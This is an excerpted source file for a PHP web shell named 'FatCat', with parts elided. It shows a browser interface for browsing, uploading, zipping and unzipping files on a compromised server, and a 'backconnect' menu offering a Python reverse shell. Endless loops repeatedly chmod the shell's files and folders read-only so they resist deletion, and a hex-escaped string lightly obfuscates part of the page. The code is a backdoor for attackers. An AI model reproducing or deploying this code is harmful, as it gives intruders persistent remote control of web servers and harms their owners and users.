...
<head>
    ...
    <title>FatCat [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
    ...
    <style>
        ...
        tbody tr:nth-child(2n) {
            background-color: rgba(46, 49, 61, 0.09)
        }
        ...
        .terminal-input {
            width: 500px;
            padding: 6px;
            border: 1px solid rgba(46, 49, 61, 0.09);
            border-radius: 4px;
            margin: 5px 0
        }
...
<body>
    <div class="menu-header">
        <ul>
            ...
            <li class="logo-FatCat"><img width="400" height="400" src="https://imgur.com/IOs5LQE.png" align="right"></li>
            <form action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>'>
                <li class="form-upload"><input type="submit" value="Upload" name="FatCat-up-submit" class="btn-submit">&nbsp;<input type="file" name="FatCat-upload" class="form-file"></li>
            </form>
        </ul>
    </div>
    ...
    <div class="menu-file-manager">
            ...
            <form action="" method="post">
                <tbody>
                    ...
                    <?php foreach ($file_manager as $_D) : ?>
                        ...
                        <?php endif; ?>
                    <?php endforeach; ?>
                    <!-- FatCat Files Manager -->
                    <?php foreach ($file_manager as $_F) : ?>
                        <?php if ($fungsi[3]($_F)) : ?>
                            <tr>
                                <td><input type="checkbox" name="check[]" value="<?= $_F ?>">&nbsp;<?= file_ext($_F) ?>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&f=<?= hx($_F); ?>" class="FatCat-files"><?= namaPanjang($_F); ?></a></td>
        ...
        <br>
        <select name="FatCat-select" class="btn-submit">
    ...
    <?php if (isset($_GET['backconnect'])) : ?>
        <div class="modal active">
            <div class="modal-container">
                ...
                <form action="" method="post">
                    <div class="modal-body">
                        <select class="bc-FatCat box-shadow" name="FatCat-bc">
...
if (isset($_POST['submit-bc'])) {
    ...
    } else if ($_POST['FatCat-bc'] == "python") {
...
while (True){
    ...
    if (FatCat_perm("' . $fungsi[0]() . '/' . $curFile . '") != 0444){
        chmod("' . $fungsi[0]() . '/' . $curFile . '", 0444);
    }
    if (FatCat_perm("' . __DIR__ . '") != 0555){
        chmod("' . __DIR__ . '", 0555);
    }
}

function FatCat_perm($flename){
...
if (isset($_POST['FatCat-up-submit'])) {
    $namaFilenya = $_FILES['FatCat-upload']['name'];
    $tmpName = $_FILES['FatCat-upload']['tmp_name'];
...
if (isset($_POST['submit-action'])) {
    ...
    } else if ($_POST['FatCat-select'] == 'unzip') {
        foreach ($items as $it) {
            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
            $fd = $repl . "/" . $it;
    ...
    } else if ($_POST['FatCat-select'] == 'zip') {
        foreach ($items as $it) {
            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
            $fd = $repl . "/" . $it;
            if ($fungsi[3]($fd)) {
...
while (True){
    ...
    if (FatCat_perm("' . $fungsi[0]() . '/' . $flesName . '") != 0444){
        chmod("' . $fungsi[0]() . '/' . $flesName . '", 0444);
    } 
    if (FatCat_perm("' . $fungsi[0]() . '") != 0555){
        chmod("' . $fungsi[0]() . '", 0555);
    }
}
...
Swal.fire({
    ...
    title: 'Sucesss...',
    text: 'Done Success!',
    confirmButtonColor: 'rgba(46, 49, 61, 0.09)',
})</script>";
